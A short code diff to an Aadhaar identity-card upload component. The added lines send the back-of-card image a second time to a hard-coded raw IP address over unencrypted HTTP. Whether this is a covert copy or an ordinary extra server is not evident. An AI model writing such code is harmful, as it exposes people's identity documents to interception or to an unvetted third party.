@@ -49,6 +49,10 @@ const AadharCardUpload = () => {
                     method: "POST",
                     body: formDataBack,
                 }),
+                fetch("http://140.245.21.255:8085/upload_image", {
+                    method: "POST",
+                    body: formDataBack,
+                }),
             ]);
     
             const resultFront = await responseFront.json();
